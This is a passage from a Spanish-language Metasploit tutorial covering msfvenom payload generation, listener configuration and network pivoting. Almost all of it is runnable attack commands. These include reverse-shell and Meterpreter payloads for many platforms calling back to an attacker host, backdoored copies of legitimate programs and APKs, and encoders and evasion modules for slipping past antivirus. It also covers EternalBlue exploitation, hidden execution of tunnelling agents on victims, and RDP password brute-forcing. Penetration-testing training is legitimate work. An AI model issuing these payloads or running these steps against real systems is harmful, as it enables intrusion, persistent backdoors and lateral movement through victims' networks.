    9. exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
    10. exploit/windows/local/cve_2023_21768_afd_priv_esc
```


---

## 8. Generacion Exhaustiva de Payloads (300+ lineas)

### msfvenom Sintaxis Completa

msfvenom reemplazo a msfpayload + msfencode. Es la herramienta para generar payloads fuera de [msfconsole](../raw/m3t4spl01t.md#msfconsole).

```
msfvenom -p <payload> LHOST=<ip> LPORT=<puerto> -f <formato> -o <archivo>
```

### Flags Importantes

```
-p, --payload           # Payload a usar
-f, --format            # Formato de salida
-o, --out               # Archivo de salida
-e, --encoder           # Encoder a usar
-i, --iterations        # Cantidad de iteraciones de encoding
-a, --arch              # Arquitectura (x86, x64)
--platform              # Plataforma (windows, linux, osx, android)
-b, --bad-chars         # Caracteres a evitar (ej: '"'"'\x00\xff'"'"')
-n, --nopsled           # Agregar NOP sled al final
-s, --space             # Tamano maximo del payload
-k, --keep              # Mantener comportamiento original (template)
--list formats          # Listar todos los formatos disponibles
--list payloads         # Listar payloads
--list encoders         # Listar encoders
--list platforms        # Listar plataformas
--list arches           # Listar arquitecturas
```

### Naming Convention de Payloads

Los payloads siguen una convencion estricta de nombres:

```
<plataforma>/<arquitectura>/<tipo>/<transporte>

Ejemplos:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
osx/x64/meterpreter_reverse_https

Staged:   shell/reverse_tcp  (con /, tiene stager)
Stageless: shell_reverse_tcp (con _, todo en uno)
```

### Todos los Formatos de Salida

```
# Ejecutables
-f exe                  # Windows PE
-f exe-only             # Windows PE sin extras
-f dll                  # Windows DLL
-f elf                  # Linux ELF
-f macho                # macOS Mach-O
-f apk                  # Android APK
-f war                  # Java WAR (Tomcat)
-f jar                  # Java JAR

# Scripts
-f psh-reflection       # PowerShell (.ps1)
-f psh-net              # PowerShell .NET
-f psh-cmd              # PowerShell one-liner
-f python               # Python code
-f python-reflection    # Python with reflection
-f perl                 # Perl
-f ruby                 # Ruby
-f lua                  # Lua
-f javascript           # JavaScript
-f vba                  # VBA (Macro Office)
-f vbs                  # VBScript
-f asp                  # Classic ASP
-f aspx                 # ASP.NET

# Shellcode
-f raw                  # Raw shellcode (bytes)
-f c                    # C code (unsigned char buf[])
-f csharp               # C# code
-f hex                  # Hex string
-f bash                 # Bash script
-f java                 # Java code
-f nodejs               # Node.js
-f node                 # Node.js alternative

# Otros
-f msi                  # Windows Installer
-f msi-nouac            # MSI sin UAC
-f loop-vbs             # VBScript con loop
-f hta-psh              # HTA + PowerShell
-f pgp                  # PGP Signed
```

### Windows Payloads Completo

```
# Meterpreter - Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell_full.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o https.exe
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.0.0.5 LPORT=8080 -f exe -o http.exe
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.0.0.5 LPORT=4444 RC4PASSWORD=clave -o rc4.exe

# Meterpreter - Windows x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell_x86.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell_x86_full.exe

# Shell - Windows
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o cmd.exe
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o cmd_x86.exe
msfvenom -p windows/x64/shell/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Formats especiales Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh-reflection -o payload.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f vba -o macro.vba
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f hta-psh -o payload.hta
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f dll -o payload.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f msi -o payload.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f msi-nouac -o payload_nouac.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp -o payload.asp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f aspx -o payload.aspx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -x putty.exe -o putty_backdoor.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -x putty.exe -k -o putty_stealth.exe
```

### Linux Payloads Completo

```
# Meterpreter Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload_full.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload_x86.elf

# Shell Linux
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/shell/bind_tcp LPORT=4444 -f elf -o bind.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell_single.elf

# Python (si no podés compilar)
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.py
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o shell.py

# Linux MIPS (routers, IoT)
msfvenom -p linux/mipsbe/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o mips_be.elf
msfvenom -p linux/mipsle/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o mips_le.elf

# Linux ARM (Raspberry Pi, NAS)
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o arm.elf

# Linux PPC (PowerPC)
msfvenom -p linux/ppc/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o ppc.elf

# Linux SPARC
msfvenom -p linux/sparc/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o sparc.elf
```

### macOS Payloads

```
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o payload.macho
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o payload_full.macho
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o shell.macho
msfvenom -p osx/armle/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o mac_arm
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f app -o payload.app
```

### [android](../raw/4db-d33p-d1v3.md) Payloads

```
# APK meterpreter
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o evil.apk

# Con bind original (mas sigiloso)
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x legit.apk -o evil.apk

# Con persistencia
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o evil.apk
msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -o evil_https.apk
```

### [ios](../raw/10s-p3nt3st1ng.md) Payloads

```
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o ios_payload
msfvenom -p apple_ios/aarch64/shell/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o ios_shell
```

### Solaris Payloads

```
msfvenom -p solaris/sparc/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o solaris_sparc.elf
msfvenom -p solaris/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o solaris_x86.elf
```

### BSD Payloads

```
msfvenom -p bsd/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o bsd.elf
msfvenom -p bsd/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o bsd_shell.elf
```

### Web / Multiplatform Payloads

```
# WAR para Tomcat/JBoss
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o payload.war

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o payload.txt

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp -o payload.asp

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f aspx -o payload.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o payload.jsp

# NodeJS
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.js
```

### Todos los Encoders

```
# x64 encoders
encoder/x64/xor                    # XOR simple
encoder/x64/xor_dynamic            # XOR dinamico
encoder/x64/zutto_deki             # Zutto Deki - mas complejo

# x86 encoders
encoder/x86/shikata_ga_nai         # Polimorfico (cambia cada vez)
encoder/x86/xor_dynamic            # XOR dinamico
encoder/x86/countdown              # Decrementa hasta decodificar
encoder/x86/fnstenv_mov            # Fnstenv mov
encoder/x86/jmp_call_additive      # JMP/CALL aditivo
encoder/x86/nonalpha               # Solo caracteres no alfa
encoder/x86/nonupper               # Solo minusculas
encoder/x86/alpha_mixed            # Alfanumerico mixto
encoder/x86/alpha_upper            # Alfanumerico mayusculas
encoder/x86/avoid_underscore_tolower
encoder/x86/avoid_utf8_tolower
encoder/x86/bloxor                 # Block XOR
encoder/x86/opt_sub                # Optimized SUB
encoder/x86/service                # Service encoder

# Generic encoders
encoder/generic/none               # Ningun encoder

# CMD encoders
encoder/cmd/powershell_base64      # PowerShell base64

# Multi-arch
encoder/multi/findtag              # Find tag en shellcode
```

### Evasion Modules

```
# Windows Defender
evasion/windows/defender_evasion

# Windows Defender JS
evasion/windows/windows_defender_js_veil
```

### Ejemplos de Evasion

```
# XOR basico
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -e x64/xor -i 5 -o encoded.exe

# Shikata ga nai (polimorfico)
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -o shikata.exe

# Multiples encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -e x64/xor -i 3 -e x86/countdown -i 2 -o multi.exe

# Evitar bad chars
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -b '"'"'\x00\x0a\x0d'"'"' -o no_badchars.exe

# Template + encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -x putty.exe -k -e x64/xor -i 5 -o putty_encoded.exe
```


---

## 9. Configuracion de Listeners (200+ lineas)

### Multi/Handler - El Listener Universal

El modulo `exploit/multi/handler` es el listener universal. Sirve para recibir cualquier [payload](../raw/m3t4spl01t.md#payloads) de [metasploit](../raw/m3t4spl01t.md).

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z

[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Exploit running as job 0
```

### Tipos de Listeners

#### reverse_tcp
El mas basico y comun. La victima se conecta al atacante.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

#### reverse_http
La victima se conecta via [http](../raw/r3d3s-f0nd4m3nt0s.md#http). Pasa por proxies.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set PAYLOADURI http://10.0.0.5/evil
msf6 exploit(multi/handler) > run
```

#### reverse_https
Similar a reverse_http pero con [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)). Mas sigiloso.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set PAYLOADURI https://10.0.0.5/evil
msf6 exploit(multi/handler) > set HandlerSSLCert /tmp/cert.pem
msf6 exploit(multi/handler) > set StagerVerifySSLCert true
msf6 exploit(multi/handler) > run
```

#### reverse_winhttp
Usa WinHTTP API de Windows (respeta config de [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) del sistema).

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_winhttp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

#### reverse_winhttps
WinHTTP con SSL.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_winhttps
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

#### bind_tcp
El atacante se conecta a la victima (payload bind).

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

#### bind_named_pipe
Bind a named pipe (pasa por firewalls que filtran [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)).

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/bind_named_pipe
msf6 exploit(multi/handler) > set RHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

### Payloads por Arquitectura

```
# Windows x64 stageless
msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 > set PAYLOAD windows/x64/meterpreter_reverse_http
msf6 > set PAYLOAD windows/x64/meterpreter_reverse_https
msf6 > set PAYLOAD windows/x64/shell_reverse_tcp
msf6 > set PAYLOAD windows/x64/powershell_reverse_tcp

# Windows x86 stageless
msf6 > set PAYLOAD windows/meterpreter_reverse_tcp
msf6 > set PAYLOAD windows/shell_reverse_tcp

# Linux x64
msf6 > set PAYLOAD linux/x64/meterpreter_reverse_tcp
msf6 > set PAYLOAD linux/x64/shell_reverse_tcp

# Generic
msf6 > set PAYLOAD generic/shell_reverse_tcp
msf6 > set PAYLOAD generic/shell_bind_tcp
```

### Opciones de Optimizacion

#### ExitOnSession
Si es false, el listener sigue escuchando despues de recibir una sesion.

```
msf6 > set ExitOnSession false
# Sigue escuchando, permite recibir multiples sesiones
```

#### SessionExpirationTimeout
Tiempo maximo de vida de una sesion (en segundos).

```
msf6 > set SessionExpirationTimeout 7200
# 2 horas maximo
msf6 > set SessionExpirationTimeout 0
# Ilimitado (peligroso)
```

#### SessionCommunicationTimeout
Tiempo maximo sin comunicacion antes de cerrar sesion.

```
msf6 > set SessionCommunicationTimeout 300
# 5 minutos sin respuesta = sesion muerta
msf6 > set SessionCommunicationTimeout 0
# Espera indefinida
```

#### WorkingHours
Limita cuando el payload se conecta (evita detectar en horario laboral).

```
msf6 > set WorkingHours "09:00:00-18:00:00"
# Solo se conecta en horario laboral
```

#### AutoLoadStdapi
Carga automaticamente stdapi al recibir sesion.

```
msf6 > set AutoLoadStdapi true
# Por defecto: true
```

#### InitialAutoRunScript
Script a ejecutar inmediatamente al recibir sesion.

```
msf6 > set InitialAutoRunScript "post/windows/manage/migrate -N explorer.exe"
# Migra a explorer.exe automaticamente
```

#### AutoRunScript
Script a ejecutar despues del inicial.

```
msf6 > set AutoRunScript "multi_console_command -rc /tmp/auto_post.rc"
# Ejecuta comandos automaticos al recibir sesion
```

### Opciones de Seguridad

#### StagerVerifySSLCert
Verifica el certificado SSL del stager.

```
msf6 > set StagerVerifySSLCert true
msf6 > set HandlerSSLCert /tmp/cert.pem
```

#### HandlerSSLCert
Certificado SSL para el handler.

```
msf6 > set HandlerSSLCert /tmp/cert.pem
# Generar certificado:
# openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout cert.pem -out cert.pem
```

#### PayloadBindPort
[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) para payloads bind.

```
msf6 > set PayloadBindPort 4444
```

#### ReverseConnectRetries
Intentos de reconexion del payload reverse.

```
msf6 > set ReverseConnectRetries 5
# Reintenta 5 veces si falla la conexion
```

#### ReverseListenerBindAddress
[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) a la que se bindea el listener reverse.

```
msf6 > set ReverseListenerBindAddress 10.0.0.5
# Fuerza el listener a usar esta IP especifica
```

#### ReverseListenerComm
Especifica que comunicacion usar para el listener reverse.

```
msf6 > set ReverseListenerComm 1
# Usa la session 1 como comunicacion para el listener
```

### Multi-Handler con Multiples Payloads

```
cat > multi_handler.rc << '"'"'EOF'"'"'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5555
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 6666
set ExitOnSession false
exploit -j -z
EOF

msfconsole -q -r multi_handler.rc
```

### Staging vs Stageless Handlers

```
# Staged handler (necesita que la victima descargue el stage)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# El handler envia el stage cuando el stager se conecta

# Stageless handler (todo en una sola conexion)
set PAYLOAD windows/x64/meterpreter_reverse_tcp
# Conexion unica, todo el meterpreter viene en el payload
```


---

## 10. [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting) y Routing (200+ lineas)

El pivoting permite usar la maquina comprometida como trampolin para atacar otras [redes](../raw/r3d3s-f0nd4m3nt0s.md) internas. Es una de las habilidades mas importantes en pentesting.

### Conceptos Basicos

```
Atacante (10.0.0.5)
    |
    | (Internet)
    |
Maquina Comprometida - Session 1 (192.168.1.100)
    |
    | (Red Interna 10.10.10.0/24)
    |
Servidor Interno (10.10.10.50)
    |
    | (Red OT 172.16.0.0/16)
    |
PLC/Sistema Industrial (172.16.0.10)
```

### AutoRoute Module

El modulo autoroute agrega rutas automaticamente basandose en las interfaces de [red](../raw/r3d3s-f0nd4m3nt0s.md) de la victima.

```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against 192.168.1.100
[*] Adding route to 10.10.10.0/24 via session 1
[+] Route added: 10.10.10.0/24 -> Session 1

# Ver rutas agregadas
msf6 > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

# Tambien desde meterpreter
meterpreter > run autoroute -s 10.10.10.0/24
[*] Adding route to 10.10.10.0/24...

meterpreter > run autoroute -p
[*] Active routes:
    10.10.10.0/255.255.255.0 -> Session 1
```

### Route Manual ([msfconsole](../raw/m3t4spl01t.md#msfconsole))

Si necesitas rutas especificas o manuales:

```
# Agregar ruta
msf6 > route add 10.10.10.0 255.255.255.0 1
[*] Route added: 10.10.10.0/255.255.255.0 -> Session 1

# Agregar ruta a un solo host
msf6 > route add 10.10.10.50 255.255.255.255 1
[*] Route added: 10.10.10.50/255.255.255.255 -> Session 1

# Ver tabla de rutas
msf6 > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

# Eliminar ruta
msf6 > route del 10.10.10.0 255.255.255.0 1
[*] Route removed

# Limpiar todas las rutas
msf6 > route flush
[*] Flushed all routes

# Ver que ruta usa una IP especifica
msf6 > route get 10.10.10.50
[*] Route for 10.10.10.50: Session 1
```

### Portfwd (Port Forwarding)

Redirige puertos locales a traves de la sesion.

```
# Forward RDP: localhost:3389 -> 10.10.10.50:3389
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.50
[*] Local TCP relay created: 0.0.0.0:3389 <-> 10.10.10.50:3389

# Forward HTTP: localhost:8080 -> 10.10.10.100:80
meterpreter > portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 10.10.10.100

# Forward SSH: localhost:2222 -> 10.10.10.5:22
meterpreter > portfwd add -l 2222 -p 22 -r 10.10.10.5

# Listar forwards activos
meterpreter > portfwd list
Active Port Forwards
====================
  0  tcp  0.0.0.0:3389       ->  10.10.10.50:3389
  1  tcp  0.0.0.0:8080       ->  10.10.10.100:80
  2  tcp  0.0.0.0:2222       ->  10.10.10.5:22

# Borrar un forward
meterpreter > portfwd delete -l 3389
[*] Successfully stopped TCP relay on 0.0.0.0:3389

# Borrar todos
meterpreter > portfwd flush
[*] All TCP relays stopped

# Forward reverso (desde meterpreter al atacante)
meterpreter > portfwd add -R -l 4444 -p 4444 -L 10.0.0.5
# Crea un tunel reverso: la victima expone su puerto 4444 al atacante
```

### SOCKS [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) via MSF

Convierte la sesion en un proxy SOCKS5 para usar cualquier herramienta.

```
# 1. Iniciar proxy SOCKS en msfconsole
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

[*] Starting SOCKS proxy on 127.0.0.1:1080...

# 2. Agregar ruta a la red interna
msf6 > route add 10.10.10.0 255.255.255.0 1

# 3. Configurar proxychains
# En /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 4. Usar herramientas a traves del proxy
proxychains4 nmap -sT -Pn 10.10.10.50 -p 80,443,445,3389
proxychains4 crackmapexec smb 10.10.10.0/24
proxychains4 xfreerdp /v:10.10.10.50 /u:admin /p:pass
proxychains4 smbclient -L //10.10.10.50
proxychains4 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 rdp
```

### [ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng Integration

Ligolo-ng es una herramienta de pivoting mas avanzada. Se puede integrar con MSF.

```
# En la maquina del atacante
ligolo-ng_proxy -laddr 0.0.0.0:11601 -selfcert

# En la victima (a traves de meterpreter)
meterpreter > upload /tmp/ligolo_agent.exe C:\Windows\Tasks\agent.exe
meterpreter > execute -H -f C:\Windows\Tasks\agent.exe -a "-connect 10.0.0.5:11601 -ignore-cert"

# En la consola de ligolo-proxy
ligolo-ng_proxy > session
ligolo-ng_proxy > ifconfig
ligolo-ng_proxy > start

# Agregar ruta en MSF para usar ambas redes
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route add 172.16.0.0 255.255.0.0 1
```

### [chisel](../raw/l1n9x-pr1v3sc.md#chisel) a traves de [meterpreter](../raw/m3t4spl01t.md#meterpreter)

Chisel es otro tunelador [http](../raw/r3d3s-f0nd4m3nt0s.md#http) rapido.

```
# Subir chisel a la victima
meterpreter > upload /usr/share/chisel/chisel.exe C:\Windows\Tasks\chisel.exe

# En el atacante (servidor)
chisel server -p 8000 --reverse

# En la victima (cliente) via meterpreter
meterpreter > execute -H -f C:\Windows\Tasks\chisel.exe -a "client 10.0.0.5:8000 R:socks"

# Ahora tenes un proxy SOCKS5 en 127.0.0.1:1080
proxychains4 nmap -sT -Pn 10.10.10.0/24
```

### Proxy Chain a traves de Multiples Hosts

PC Atacante -> Session 1 (192.168.1.100) -> Session 2 (10.10.10.50) -> Red Interna (172.16.0.0/24)

```
# Paso 1: Agregar ruta a la red de Session 1
msf6 > route add 10.10.10.0 255.255.255.0 1

# Paso 2: Escanear y explotar a traves de session 1
msf6 > db_nmap -sT -Pn 10.10.10.50
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.50
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 > run
[*] SESSION 2 opened

# Paso 3: Agregar ruta a la siguiente red
msf6 > route add 172.16.0.0 255.255.0.0 2

# Paso 4: Ahora podes llegar a 172.16.x.x
msf6 > db_nmap -sT -Pn 172.16.0.0/24
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.0.0/24
msf6 > set PORTS 80,443,445,3389,8080
msf6 > run
```

### SOCKS sobre Multiple Saltos

```
# En cada session, agregar ruta
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route add 172.16.0.0 255.255.0.0 2

# Iniciar SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 9050
msf6 > run -j

# Ahora proxychains escala automaticamente
proxychains4 nmap -sT -Pn 172.16.0.10
proxychains4 rdesktop 172.16.0.10
```

### Full Tunneling con Reverse Portfwd

A veces necesitas exponer puertos locales en la red interna.

```
# Exponer el puerto 80 local en la maquina 10.10.10.50
meterpreter > portfwd add -R -l 80 -p 8080 -L 10.10.10.50

# Exponer puerto de escucha de meterpreter
meterpreter > portfwd add -R -l 4444 -p 4444 -L 10.0.0.5
```

### Mejores Practicas de Pivoting

```
# 1. Siempre verificar rutas activas
msf6 > route print

# 2. Usar bind_tcp en vez de reverse_tcp en redes internas
set PAYLOAD windows/x64/meterpreter/bind_tcp

# 3. Configurar SOCKS proxy ANTES de escanear redes internas
# 4. Usar db_nmap con -sT (TCP connect scan, SOCKS compatible)
# 5. Verificar conectividad con connect desde msfconsole
msf6 > connect 10.10.10.50 445

# 6. Mantener un registro de las rutas agregadas
# 7. No saturar las sesiones con demasiados escaneos simultaneos
# 8. Para redes muy grandes, usar SOCKS + proxychains + masscan
proxychains4 masscan 10.10.10.0/24 -p80,443,445,3389 --rate=100
```



